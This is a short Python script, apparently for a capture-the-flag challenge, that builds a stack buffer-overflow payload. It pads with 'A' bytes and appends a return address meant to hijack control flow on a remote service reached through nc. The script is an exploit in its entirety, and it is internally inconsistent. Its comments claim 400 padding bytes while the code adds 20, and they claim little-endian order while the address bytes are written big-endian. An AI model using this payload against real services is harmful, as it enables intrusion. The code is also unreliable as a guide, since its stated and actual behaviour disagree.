import sys
payload = b''
payload += b'A' * 20 # Add \x41 for 400 times
payload += b'\x08\x04\x91\x92' # Add 0x08049192 to the payload in
# little-endian manner
sys.stdout.buffer.write(payload) # write bytes in standard output
print() # recommended to use for the nc-based exploitation
# to flush the remote server's stdin buffer